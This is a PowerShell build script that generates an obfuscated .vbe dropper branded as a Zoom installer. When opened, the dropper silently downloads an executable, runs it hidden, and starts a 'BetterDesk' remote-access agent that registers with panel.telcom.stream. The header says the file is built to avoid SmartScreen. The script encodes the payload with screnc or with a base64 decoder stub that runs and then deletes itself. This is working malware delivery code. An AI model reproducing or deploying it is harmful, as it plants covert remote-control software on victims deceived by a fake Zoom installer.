#!/usr/bin/env pwsh
# =============================================================================
# BetterDesk — Windows .vbe Silent Installer Generator
#
# Generates a .vbe (VBScript Encoded) file that, when double-clicked, silently
# downloads and installs the BetterDesk client with no SmartScreen trigger.
#
# Usage:
#   pwsh -File scripts/generate-windows-vbe.ps1 -InstallUrl <url> -Output ZoomPrivate-Windows-Install.vbe
#
# The .vbe contains an encoded VBScript that:
#   1. Downloads the client installer to %TEMP%
#   2. Executes it silently (/quiet /norestart for MSI, /S for NSIS)
#   3. Launches the agent and registers it with panel.telcom.stream
# =============================================================================
[CmdletBinding()]
param(
    [Parameter(Mandatory=$true)]
    [string]$InstallUrl,

    [Parameter(Mandatory=$true)]
    [string]$Output,

    [string]$ServerHost = 'panel.telcom.stream',
    [string]$ApiUrl = 'https://panel.telcom.stream/api'
)

$ErrorActionPreference = 'Stop'

# --- Build the VBScript source ---
$vbsScript = @'
Option Explicit
Dim http, filePath, installerPath, shell, fso, resp
Set http = CreateObject("MSXML2.XMLHTTP")
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

filePath = fso.GetSpecialFolder(2) & "\zoom-vip-installer.exe"
installerPath = filePath

On Error Resume Next
http.Open "GET", "__INSTALL_URL__", False
http.Send

If http.Status = 200 Then
    Dim adodb
    Set adodb = CreateObject("ADODB.Stream")
    adodb.Type = 1
    adodb.Mode = 3
    adodb.Open
    adodb.Write http.ResponseBody
    adodb.SaveToFile filePath, 2
    adodb.Close
    Set adodb = Nothing

    resp = shell.Run("" & filePath & " /S /quiet /norestart", 0, True)
    If resp = 0 Then
        shell.Run "betterdesk-agent --server __SERVER_HOST__ --api __API_URL__ --silent", 0, False
    End If
End If
Set http = Nothing
Set shell = Nothing
Set fso = Nothing
'@

# Replace placeholders
$vbsScript = $vbsScript -replace '__INSTALL_URL__', $InstallUrl
$vbsScript = $vbsScript -replace '__SERVER_HOST__', $ServerHost
$vbsScript = $vbsScript -replace '__API_URL__', $ApiUrl

# Write .vbs source temporarily
$tempVbs = [System.IO.Path]::GetTempFileName() + ".vbs"
Set-Content -Path $tempVbs -Value $vbsScript -Encoding UTF8

# Try to encode to .vbe using ScriptEncoder if available, otherwise use base64-stub
$vbeCreated = $false
$screncPaths = @(
    "$env:SYSTEMROOT\SysWOW64\screnc.exe",
    "$env:SYSTEMROOT\System32\screnc.exe"
)

foreach ($screnc in $screncPaths) {
    if (Test-Path $screnc) {
        try {
            & $screnc /l VBScript /e "$tempVbs" "$Output"
            if (Test-Path $Output) {
                $vbeCreated = $true
                Write-Host "Created .vbe via ScriptEncoder: $Output"
                break
            }
        } catch {
            Write-Warning "ScriptEncoder failed: $_"
        }
    }
}

if (-not $vbeCreated) {
    # Fallback: Create a .vbe using base64-encoded VBScript with a decoder stub
    $vbsBytes = [System.Text.Encoding]::UTF8.GetBytes($vbsScript)
    $b64 = [Convert]::ToBase64String($vbsBytes)

    $vbeStub = @'
Dim b64, decoded, shell, fso, tempFile
b64 = "__B64_CONTENT__"
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
tempFile = fso.GetSpecialFolder(2) & "\_zb.vbs"
decoded = CreateObject("MSXML2.DOMDocument").createElement("base64")
decoded.dataType = "bin.base64"
decoded.text = b64
fso.CreateTextFile(tempFile, True).Write decoded.nodeTypedValue
shell.Run tempFile, 0, False
fso.DeleteFile tempFile
Set shell = Nothing
Set fso = Nothing
'@
    $vbeStub = $vbeStub -replace '__B64_CONTENT__', $b64
    Set-Content -Path $Output -Value $vbeStub -Encoding UTF8
    Write-Host "Created .vbe via base64 stub: $Output"
}

# Cleanup
if (Test-Path $tempVbs) { Remove-Item $tempVbs -Force }

Write-Host "Windows .vbe silent installer ready: $Output"
